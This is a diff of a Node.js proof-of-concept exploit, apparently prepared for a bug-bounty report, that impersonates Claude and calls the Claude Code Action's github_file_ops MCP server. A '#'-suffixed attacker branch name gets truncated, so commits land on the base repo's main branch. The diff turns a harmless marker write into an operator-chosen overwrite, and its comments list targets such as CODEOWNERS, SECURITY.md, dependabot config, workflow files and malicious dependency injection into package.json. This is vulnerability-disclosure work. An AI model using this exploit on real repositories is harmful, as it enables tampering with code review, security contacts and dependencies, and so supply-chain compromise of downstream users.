@@ -1,30 +1,36 @@
 #!/usr/bin/env node
-// fake-claude-v2.mjs
+// fake-claude-supply-chain-variant.mjs
 //
-// This variant of the deterministic Claude replacement adds explicit logging of
-// the BRANCH_NAME env var that the Claude Code Action's install-mcp-server
-// injected into the github_file_ops MCP server config. This is important
-// evidence for the bug report: it proves that BRANCH_NAME really is the
-// attacker-controlled PR head branch (e.g. "main#external") *before* the
-// GitHub API URL construction, so the truncation to "main" happens inside
-// the vulnerable file-ops server, not in the harness.
+// Amplification variant. Same wrong-ref primitive, but the seeded file is
+// a repo path that materially affects downstream consumers of base main:
 //
-// Nothing else about the reproduction differs.
+//   * `.github/CODEOWNERS`   — silently reroute review requirements
+//   * `.github/dependabot.yml` — silently reconfigure dependency policy
+//   * `SECURITY.md`          — silently rewrite security-contact info
+//   * `package.json` / `pyproject.toml` / `Cargo.toml`
+//                            — inject a dependency on a malicious package
+//                              on the next release build
+//   * `.github/workflows/*.yml`
+//                            — only reachable when the workflow token has
+//                              `workflows: write`, e.g. custom PAT or
+//                              GitHub App token
 //
-// The Anthropic-provided MCP config passes github_file_ops with:
-//   server.env.BRANCH_NAME = branchInfo.claudeBranch || branchInfo.currentBranch
-// which for an open cross-repo PR is prData.headRefName.
+// The PoC does NOT choose a real supply-chain target on its own. The
+// operator picks the target with POC_SUPPLY_CHAIN_TARGET and
+// POC_SUPPLY_CHAIN_CONTENT. This keeps the artifact policy-safe while
+// making the impact reproducible on the PoC repository.
 //
-// This log line lets Bugcrowd triagers see the exact BRANCH_NAME value in
-// the run log without having to trust the report body.
+// The point of shipping this variant is to make it obvious that the
+// wrong-ref write is not confined to writing "e2e-action-marker.txt".
 
 import { spawn } from "node:child_process";
-import { writeFileSync } from "node:fs";
+import { writeFileSync, mkdirSync } from "node:fs";
+import { dirname } from "node:path";
 import { randomUUID } from "node:crypto";
 
 function log(message, data) {
   const suffix = data === undefined ? "" : ` ${JSON.stringify(data)}`;
-  console.error(`[fake-claude] ${message}${suffix}`);
+  console.error(`[fake-claude-supply-chain] ${message}${suffix}`);
 }
 
 function argValue(name) {
@@ -71,41 +77,44 @@ function waitForResponse(child, id) {
   });
 }
 
-async function callFileOpsCommit() {
+async function driveMcp() {
   const config = parseMcpConfig();
   const server = config.mcpServers?.github_file_ops;
   if (!server) throw new Error("github_file_ops server missing from MCP config");
 
-  // Extra evidence for the report: dump the exact BRANCH_NAME that the
-  // Anthropic action put in the MCP server env. This should equal the
-  // attacker-controlled PR head branch (e.g. "main#external").
   const attackerBranch = server.env?.BRANCH_NAME;
   log("ACTION_INJECTED_BRANCH_NAME_ENV", attackerBranch);
-  log("PROCESS_ENV_GITHUB_HEAD_REF", process.env.GITHUB_HEAD_REF);
-  log("PROCESS_ENV_GITHUB_REF_NAME", process.env.GITHUB_REF_NAME);
-  log("PROCESS_ENV_GITHUB_BASE_REF", process.env.GITHUB_BASE_REF);
   log("BRANCH_NAME_CONTAINS_HASH", attackerBranch?.includes("#"));
 
-  const markerPath = "e2e-action-marker.txt";
-  const marker = [
-    `intended branch (from BRANCH_NAME env): ${attackerBranch}`,
-    `intended branch (from GITHUB_HEAD_REF):  ${process.env.GITHUB_HEAD_REF || process.env.GITHUB_REF_NAME}`,
-    `run id: ${process.env.GITHUB_RUN_ID}`,
-    `workspace: ${process.env.GITHUB_WORKSPACE}`,
-    "",
-    "This file was committed by the Claude Code Action github_file_ops",
-    "server. Its presence on refs/heads/main in the base repo demonstrates",
-    "that the '#'-suffixed BRANCH_NAME was truncated at the GitHub REST",
-    "API URL construction step. The intended branch above should be a",
-    "hash-suffixed name; the ref that actually moved is the prefix.",
-    "",
-  ].join("\n");
-  writeFileSync(markerPath, marker);
+  const targetPath =
+    process.env.POC_SUPPLY_CHAIN_TARGET || "supply-chain-marker.txt";
+  const content =
+    process.env.POC_SUPPLY_CHAIN_CONTENT ||
+    [
+      `intended branch: ${attackerBranch}`,
+      `run id: ${process.env.GITHUB_RUN_ID}`,
+      `workspace: ${process.env.GITHUB_WORKSPACE}`,
+      "",
+      "Supply-chain-shape marker written on the truncated ref through",
+      "Claude Code Action's github_file_ops server. The target path is",
+      "configurable via POC_SUPPLY_CHAIN_TARGET; use CODEOWNERS,",
+      "SECURITY.md, dependabot.yml, package.json (with a dependency",
+      "injection payload), or workflow files (when the token has",
+      "workflows: write) to demonstrate the escalation.",
+      "",
+    ].join("\n");
+
+  const dir = dirname(targetPath);
+  if (dir && dir !== "." && dir !== "/") {
+    mkdirSync(dir, { recursive: true });
+  }
+  writeFileSync(targetPath, content);
 
   log("spawning mcp server", {
     command: server.command,
     args: server.args,
     branch: attackerBranch,
+    target: targetPath,
   });
 
   const child = spawn(server.command, server.args, {
@@ -125,7 +134,7 @@ async function callFileOpsCommit() {
     params: {
       protocolVersion: "2024-11-05",
       capabilities: {},
-      clientInfo: { name: "fake-claude-e2e", version: "2.0.0" },
+      clientInfo: { name: "fake-claude-supply-chain", version: "1.0.0" },
     },
   });
   await waitForResponse(child, 1);
@@ -141,8 +150,8 @@ async function callFileOpsCommit() {
     params: {
       name: "commit_files",
       arguments: {
-        files: [markerPath],
-        message: "poc: claude action e2e hash ref confusion",
+        files: [targetPath],
+        message: `poc(supply-chain): overwrite ${targetPath} on wrong ref`,
       },
     },
   });
@@ -159,11 +168,7 @@ process.stdin.on("data", (chunk) => {
   stdin += chunk.toString("utf8");
   scheduleStart();
 });
-
-process.stdin.on("end", () => {
-  scheduleStart(0);
-});
-
+process.stdin.on("end", () => scheduleStart(0));
 function scheduleStart(delay = 1000) {
   if (started) return;
   started = true;
@@ -173,16 +178,14 @@ function scheduleStart(delay = 1000) {
 async function run() {
   const sessionId = randomUUID();
   try {
-    log("argv", process.argv.slice(2));
-    log("stdin bytes", stdin.length);
-    const result = await callFileOpsCommit();
+    const result = await driveMcp();
     console.log(
       JSON.stringify({
         type: "system",
         subtype: "init",
         session_id: sessionId,
         tools: ["mcp__github_file_ops__commit_files"],
-        model: "fake-claude",
+        model: "fake-claude-supply-chain",
       }),
     );
     console.log(
